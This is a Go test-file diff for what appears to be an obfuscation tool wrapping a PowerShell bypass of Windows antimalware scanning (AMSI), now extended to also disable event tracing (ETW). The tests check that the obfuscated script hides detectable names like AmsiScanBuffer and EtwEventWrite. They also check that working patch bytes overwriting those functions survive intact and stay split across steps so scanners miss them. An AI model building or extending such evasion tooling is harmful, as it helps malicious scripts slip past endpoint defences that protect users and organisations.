@@ -17,7 +17,7 @@ func obf(seed int64) string {
 func TestObfuscationLeavesNoTelltaleLiterals(t *testing.T) {
 	for seed := int64(1); seed <= 20; seed++ {
 		got := obf(seed)
-		for _, lit := range []string{"amsi.dll", "AmsiScanBuffer", "kernel32.dll", "System.dll"} {
+		for _, lit := range []string{"amsi.dll", "AmsiScanBuffer", "kernel32.dll", "System.dll", "ntdll", "EtwEventWrite"} {
 			if strings.Contains(got, lit) {
 				t.Errorf("seed %d: script still contains the literal %q", seed, lit)
 			}
@@ -86,7 +86,7 @@ func decodeCharExpr(t *testing.T, expr string) string {
 
 func TestCharExpressionRoundTrips(t *testing.T) {
 	r := rand.New(rand.NewSource(3))
-	for _, s := range []string{"amsi.dll", "AmsiScanBuffer", "kernel32.dll", `\`, "System.dll", "MyDelegateType"} {
+	for _, s := range []string{"amsi.dll", "AmsiScanBuffer", "kernel32.dll", `\`, "System.dll", "MyDelegateType", "ntdll", "EtwEventWrite"} {
 		for i := 0; i < 40; i++ { // many draws: the encoding picks a form at random
 			expr := charExpression(s, r)
 			if got := decodeCharExpr(t, expr); got != s {
@@ -111,12 +111,21 @@ func TestCharExpressionHandlesHighBytes(t *testing.T) {
 // The payload's own bytes must survive verbatim: this is the stub written over
 // AmsiScanBuffer's prologue, and a corrupted one would be executed.
 func TestPatchBytesAreUnchanged(t *testing.T) {
-	const patch = "0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3"
-	if !strings.Contains(bypass4MSITemplate, patch) {
-		t.Fatal("the template no longer carries upstream's patch bytes")
-	}
-	if !strings.Contains(obf(5), patch) {
-		t.Error("obfuscation altered the patch bytes")
+	for _, tc := range []struct {
+		name  string
+		patch string
+	}{
+		{"AMSI", "0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3"},
+		{"ETW", "0x31,0xc0,0xc3"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			if !strings.Contains(bypass4MSITemplate, tc.patch) {
+				t.Fatalf("the template no longer carries %s patch bytes", tc.name)
+			}
+			if !strings.Contains(obf(5), tc.patch) {
+				t.Errorf("obfuscation altered the %s patch bytes", tc.name)
+			}
+		})
 	}
 }
 
@@ -124,8 +133,8 @@ func TestPatchBytesAreUnchanged(t *testing.T) {
 // would put the whole patch in a single scanned block.
 func TestTemplateSplitsIntoSteps(t *testing.T) {
 	steps := strings.Split(obf(9), jumpMarker)
-	if len(steps) != 10 {
-		t.Errorf("got %d steps, want 10 (upstream's split)", len(steps))
+	if len(steps) != 11 {
+		t.Errorf("got %d steps, want 11 (upstream's split + ETW patch)", len(steps))
 	}
 	for i, s := range steps {
 		if strings.TrimSpace(s) == "" {
